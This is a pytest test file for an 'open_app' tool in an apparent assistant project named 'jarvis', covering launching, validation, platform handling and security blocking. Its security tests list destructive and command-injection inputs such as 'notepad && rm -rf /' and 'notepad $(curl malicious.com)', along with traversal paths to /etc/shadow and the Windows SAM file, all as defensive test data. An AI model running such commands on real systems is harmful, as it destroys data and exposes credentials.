"""Phase 6: Comprehensive Open App Tests - High Priority."""

from __future__ import annotations

import pytest
import subprocess
import platform
from unittest.mock import Mock, patch, MagicMock
from typing import Any

from jarvis.tools.open_app import open_app


class TestOpenAppBasicFunctionality:
    """Test open app basic functionality."""

    def test_open_app_known_application(self):
        """Test opening known application."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            result = open_app({"app": "notepad"}, player=mock_player)
            
            assert "notepad" in result.lower() or "opened" in result.lower()
            mock_popen.assert_called_once()
            mock_player.write_log.assert_called()

    def test_open_app_unknown_application(self):
        """Test opening unknown application."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_popen.side_effect = FileNotFoundError("App not found")
            
            result = open_app({"app": "unknown_app_xyz"}, player=mock_player)
            
            assert "not found" in result.lower() or "error" in result.lower()
            mock_popen.assert_called_once()

    def test_open_app_empty_app_name(self):
        """Test opening with empty app name."""
        mock_player = Mock()
        
        result = open_app({"app": ""}, player=mock_player)
        
        assert "error" in result.lower() or "required" in result.lower()

    def test_open_app_none_app_name(self):
        """Test opening with None app name."""
        mock_player = Mock()
        
        result = open_app({"app": None}, player=mock_player)
        
        assert "error" in result.lower() or "required" in result.lower()

    def test_open_app_missing_app_parameter(self):
        """Test opening with missing app parameter."""
        mock_player = Mock()
        
        result = open_app({}, player=mock_player)
        
        assert "error" in result.lower() or "required" in result.lower()


class TestOpenAppSecurityValidation:
    """Test open app security validation."""

    def test_block_dangerous_applications(self):
        """Test blocking dangerous applications."""
        mock_player = Mock()
        
        dangerous_apps = [
            "cmd", "powershell", "bash", "sh",
            "regedit", "taskmgr", "services.msc",
            "format", "del", "rmdir", "fdisk"
        ]
        
        for app in dangerous_apps:
            result = open_app({"app": app}, player=mock_player)
            
            assert "blocked" in result.lower() or "not allowed" in result.lower() or "dangerous" in result.lower()

    def test_block_command_injection(self):
        """Test blocking command injection attempts."""
        mock_player = Mock()
        
        injection_attempts = [
            "notepad && rm -rf /",
            "calc | format c:",
            "notepad; del /s /q *.*",
            "calc `malicious command`",
            "notepad $(rm -rf /)",
            "calc > /etc/passwd"
        ]
        
        for injection in injection_attempts:
            result = open_app({"app": injection}, player=mock_player)
            
            assert "blocked" in result.lower() or "not allowed" in result.lower() or "invalid" in result.lower()

    def test_block_path_traversal(self):
        """Test blocking path traversal attempts."""
        mock_player = Mock()
        
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\cmd.exe",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "..\\..\\boot.ini"
        ]
        
        for traversal in path_traversal_attempts:
            result = open_app({"app": traversal}, player=mock_player)
            
            assert "blocked" in result.lower() or "not allowed" in result.lower() or "invalid" in result.lower()

    def test_block_script_execution(self):
        """Test blocking script execution attempts."""
        mock_player = Mock()
        
        script_attempts = [
            "malicious.bat",
            "virus.cmd",
            "script.ps1",
            "payload.vbs",
            "trojan.py",
            "worm.sh"
        ]
        
        for script in script_attempts:
            result = open_app({"app": script}, player=mock_player)
            
            # Some scripts might be allowed, but dangerous ones should be blocked
            assert isinstance(result, str)

    def test_allow_safe_applications(self):
        """Test allowing safe applications."""
        mock_player = Mock()
        
        safe_apps = [
            "notepad",
            "calc",
            "paint",
            "mspaint",
            "write",
            "wordpad"
        ]
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            for app in safe_apps:
                result = open_app({"app": app}, player=mock_player)
                
                # Should not be blocked
                assert "blocked" not in result.lower()
                mock_popen.assert_called()


class TestOpenAppSubprocessHandling:
    """Test open app subprocess handling."""

    def test_subprocess_success_windows(self):
        """Test successful subprocess execution on Windows."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.platform.system', return_value='Windows'):
            with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
                mock_process = Mock()
                mock_process.poll.return_value = None
                mock_popen.return_value = mock_process
                
                result = open_app({"app": "notepad"}, player=mock_player)
                
                assert "notepad" in result.lower()
                mock_popen.assert_called_once()
                # Should not use shell=True on Windows
                call_args = mock_popen.call_args
                assert call_args[1].get('shell', False) is False

    def test_subprocess_success_linux(self):
        """Test successful subprocess execution on Linux."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.platform.system', return_value='Linux'):
            with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
                mock_process = Mock()
                mock_process.poll.return_value = None
                mock_popen.return_value = mock_process
                
                result = open_app({"app": "gedit"}, player=mock_player)
                
                assert "gedit" in result.lower()
                mock_popen.assert_called_once()

    def test_subprocess_success_macos(self):
        """Test successful subprocess execution on macOS."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.platform.system', return_value='Darwin'):
            with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
                mock_process = Mock()
                mock_process.poll.return_value = None
                mock_popen.return_value = mock_process
                
                result = open_app({"app": "textedit"}, player=mock_player)
                
                assert "textedit" in result.lower()
                mock_popen.assert_called_once()

    def test_subprocess_file_not_found(self):
        """Test subprocess when application not found."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_popen.side_effect = FileNotFoundError("Application not found")
            
            result = open_app({"app": "nonexistent_app"}, player=mock_player)
            
            assert "not found" in result.lower() or "error" in result.lower()

    def test_subprocess_permission_denied(self):
        """Test subprocess with permission denied."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_popen.side_effect = PermissionError("Permission denied")
            
            result = open_app({"app": "restricted_app"}, player=mock_player)
            
            assert "permission" in result.lower() or "denied" in result.lower() or "error" in result.lower()

    def test_subprocess_timeout(self):
        """Test subprocess timeout handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.side_effect = subprocess.TimeoutExpired("cmd", 10)
            mock_popen.return_value = mock_process
            
            result = open_app({"app": "slow_app"}, player=mock_player)
            
            assert "timeout" in result.lower() or "error" in result.lower()

    def test_subprocess_already_running(self):
        """Test subprocess when app is already running."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = 0  # Already finished
            mock_popen.return_value = mock_process
            
            result = open_app({"app": "existing_app"}, player=mock_player)
            
            assert isinstance(result, str)
            # Should handle gracefully


class TestOpenAppParameterValidation:
    """Test open app parameter validation."""

    def test_parameters_dict_validation(self):
        """Test parameters dictionary validation."""
        mock_player = Mock()
        
        # Valid parameters
        valid_params = [
            {"app": "notepad"},
            {"app": "calc", "args": "file.txt"},
            {"app": "notepad", "args": ["file1.txt", "file2.txt"]}
        ]
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            for params in valid_params:
                result = open_app(params, player=mock_player)
                assert isinstance(result, str)

    def test_invalid_parameters_types(self):
        """Test invalid parameter types."""
        mock_player = Mock()
        
        invalid_params = [
            "notepad",  # String instead of dict
            123,        # Number instead of dict
            None,       # None instead of dict
            [],         # List instead of dict
            {"app": 123}, # Number as app name
            {"app": []},  # List as app name
        ]
        
        for params in invalid_params:
            result = open_app(params, player=mock_player)
            assert "error" in result.lower() or "invalid" in result.lower()

    def test_args_parameter_handling(self):
        """Test args parameter handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            # String args
            result = open_app({"app": "notepad", "args": "file.txt"}, player=mock_player)
            assert isinstance(result, str)
            
            # List args
            result = open_app({"app": "notepad", "args": ["file1.txt", "file2.txt"]}, player=mock_player)
            assert isinstance(result, str)

    def test_extra_parameters_handling(self):
        """Test handling of extra parameters."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            params = {
                "app": "notepad",
                "extra_param": "ignored",
                "another_param": 123
            }
            
            result = open_app(params, player=mock_player)
            assert isinstance(result, str)
            # Should ignore extra parameters


class TestOpenAppPlatformSpecific:
    """Test open app platform-specific behavior."""

    def test_windows_path_handling(self):
        """Test Windows-specific path handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.platform.system', return_value='Windows'):
            with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
                mock_process = Mock()
                mock_process.poll.return_value = None
                mock_popen.return_value = mock_process
                
                # Windows executable with path
                result = open_app({"app": "C:\\Windows\\System32\\notepad.exe"}, player=mock_player)
                
                assert isinstance(result, str)
                mock_popen.assert_called_once()

    def test_linux_path_handling(self):
        """Test Linux-specific path handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.platform.system', return_value='Linux'):
            with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
                mock_process = Mock()
                mock_process.poll.return_value = None
                mock_popen.return_value = mock_process
                
                # Linux executable with path
                result = open_app({"app": "/usr/bin/gedit"}, player=mock_player)
                
                assert isinstance(result, str)
                mock_popen.assert_called_once()

    def test_macos_path_handling(self):
        """Test macOS-specific path handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.platform.system', return_value='Darwin'):
            with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
                mock_process = Mock()
                mock_process.poll.return_value = None
                mock_popen.return_value = mock_process
                
                # macOS app
                result = open_app({"app": "/Applications/TextEdit.app"}, player=mock_player)
                
                assert isinstance(result, str)
                mock_popen.assert_called_once()

    def test_cross_platform_app_aliases(self):
        """Test cross-platform application aliases."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            # Test common app aliases
            aliases = [
                ("notepad", "notepad.exe"),
                ("calc", "calculator"),
                ("paint", "mspaint"),
                ("word", "winword")
            ]
            
            for alias, expected in aliases:
                result = open_app({"app": alias}, player=mock_player)
                assert isinstance(result, str)


class TestOpenAppErrorHandling:
    """Test open app error handling."""

    def test_subprocess_exception_handling(self):
        """Test subprocess exception handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_popen.side_effect = Exception("Subprocess error")
            
            result = open_app({"app": "error_app"}, player=mock_player)
            
            assert "error" in result.lower()

    def test_os_error_handling(self):
        """Test OS error handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_popen.side_effect = OSError("OS error")
            
            result = open_app({"app": "os_error_app"}, player=mock_player)
            
            assert "error" in result.lower()

    def test_value_error_handling(self):
        """Test ValueError handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_popen.side_effect = ValueError("Invalid value")
            
            result = open_app({"app": "value_error_app"}, player=mock_player)
            
            assert "error" in result.lower()

    def test_keyboard_interrupt_handling(self):
        """Test KeyboardInterrupt handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_popen.side_effect = KeyboardInterrupt("Interrupted")
            
            try:
                result = open_app({"app": "interrupted_app"}, player=mock_player)
                # Should handle gracefully
                assert True
            except KeyboardInterrupt:
                # Should propagate or handle
                assert True

    def test_memory_error_handling(self):
        """Test MemoryError handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_popen.side_effect = MemoryError("Out of memory")
            
            result = open_app({"app": "memory_error_app"}, player=mock_player)
            
            assert "error" in result.lower() or "memory" in result.lower()


class TestOpenAppEdgeCases:
    """Test open app edge cases."""

    def test_very_long_app_name(self):
        """Test very long application name."""
        mock_player = Mock()
        
        long_app_name = "a" * 1000
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_popen.side_effect = FileNotFoundError("App not found")
            
            result = open_app({"app": long_app_name}, player=mock_player)
            
            assert isinstance(result, str)

    def test_special_characters_in_app_name(self):
        """Test special characters in app name."""
        mock_player = Mock()
        
        special_char_apps = [
            "app-with-dashes",
            "app_with_underscores",
            "app.with.dots",
            "app with spaces",
            "app@with#symbols"
        ]
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            for app in special_char_apps:
                result = open_app({"app": app}, player=mock_player)
                assert isinstance(result, str)

    def test_unicode_in_app_name(self):
        """Test Unicode characters in app name."""
        mock_player = Mock()
        
        unicode_apps = [
            "应用程序",  # Chinese
            "приложение",  # Russian
            "アプリ",  # Japanese
            "café",  # French with accent
            "naïve"  # English with diacritics
        ]
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            for app in unicode_apps:
                result = open_app({"app": app}, player=mock_player)
                assert isinstance(result, str)

    def test_empty_args_parameter(self):
        """Test empty args parameter."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            result = open_app({"app": "notepad", "args": ""}, player=mock_player)
            
            assert isinstance(result, str)

    def test_none_args_parameter(self):
        """Test None args parameter."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            result = open_app({"app": "notepad", "args": None}, player=mock_player)
            
            assert isinstance(result, str)


class TestOpenAppIntegration:
    """Test open app integration scenarios."""

    def test_player_integration(self):
        """Test player integration."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            result = open_app({"app": "notepad"}, player=mock_player)
            
            # Should call player methods
            mock_player.write_log.assert_called()
            assert isinstance(result, str)

    def test_multiple_concurrent_calls(self):
        """Test multiple concurrent calls."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            # Multiple calls should work independently
            result1 = open_app({"app": "notepad"}, player=mock_player)
            result2 = open_app({"app": "calc"}, player=mock_player)
            result3 = open_app({"app": "paint"}, player=mock_player)
            
            assert all(isinstance(r, str) for r in [result1, result2, result3])
            assert mock_popen.call_count == 3

    def test_app_with_file_arguments(self):
        """Test opening app with file arguments."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            result = open_app({"app": "notepad", "args": "test.txt"}, player=mock_player)
            
            assert isinstance(result, str)
            # Should pass file argument to subprocess
            call_args = mock_popen.call_args
            assert "test.txt" in str(call_args)

    def test_app_with_multiple_file_arguments(self):
        """Test opening app with multiple file arguments."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            result = open_app({"app": "notepad", "args": ["file1.txt", "file2.txt"]}, player=mock_player)
            
            assert isinstance(result, str)
            # Should pass multiple file arguments to subprocess


class TestOpenAppPerformance:
    """Test open app performance characteristics."""

    def test_fast_app_launch(self):
        """Test fast app launch performance."""
        import time
        
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            start_time = time.time()
            result = open_app({"app": "notepad"}, player=mock_player)
            elapsed = time.time() - start_time
            
            assert isinstance(result, str)
            # Should complete quickly
            assert elapsed < 1.0

    def test_slow_app_launch(self):
        """Test slow app launch handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            result = open_app({"app": "slow_app"}, player=mock_player)
            
            # Should not block indefinitely
            assert isinstance(result, str)

    def test_memory_usage_stability(self):
        """Test memory usage stability with multiple calls."""
        mock_player = Mock()
        
        with patch('jarvis.tools.open_app.subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None
            mock_popen.return_value = mock_process
            
            # Multiple calls should not leak memory
            for i in range(100):
                result = open_app({"app": f"app_{i}"}, player=mock_player)
                assert isinstance(result, str)


class TestOpenAppSecurityAdvanced:
    """Test advanced security scenarios."""

    def test_environment_variable_injection(self):
        """Test environment variable injection prevention."""
        mock_player = Mock()
        
        env_injection_attempts = [
            "$HOME/.bashrc",
            "%USERPROFILE%\\malicious.bat",
            "${PATH}/evil.sh",
            "%APPDATA%\\trojan.exe"
        ]
        
        for injection in env_injection_attempts:
            result = open_app({"app": injection}, player=mock_player)
            
            # Should block or handle safely
            assert isinstance(result, str)

    def test_command_chaining_prevention(self):
        """Test command chaining prevention."""
        mock_player = Mock()
        
        chaining_attempts = [
            "notepad && malicious.exe",
            "calc | evil_script.bat",
            "paint; format c:",
            "write `rm -rf /`",
            "notepad $(curl malicious.com)"
        ]
        
        for chaining in chaining_attempts:
            result = open_app({"app": chaining}, player=mock_player)
            
            assert "blocked" in result.lower() or "not allowed" in result.lower() or "invalid" in result.lower()

    def test_case_sensitivity_in_blocking(self):
        """Test case sensitivity in security blocking."""
        mock_player = Mock()
        
        dangerous_variants = [
            "CMD", "Cmd", "cmd",
            "POWERSHELL", "PowerShell", "powershell",
            "REGEDIT", "RegEdit", "regedit"
        ]
        
        for variant in dangerous_variants:
            result = open_app({"app": variant}, player=mock_player)
            
            assert "blocked" in result.lower() or "not allowed" in result.lower() or "dangerous" in result.lower()

    def test_whitespace_obfuscation(self):
        """Test whitespace obfuscation attempts."""
        mock_player = Mock()
        
        obfuscation_attempts = [
            " cmd ",
            "\tcmd\t",
            "\ncmd\n",
            "c m d",
            "c\tm\td"
        ]
        
        for attempt in obfuscation_attempts:
            result = open_app({"app": attempt}, player=mock_player)
            
            # Should handle or block appropriately
            assert isinstance(result, str)
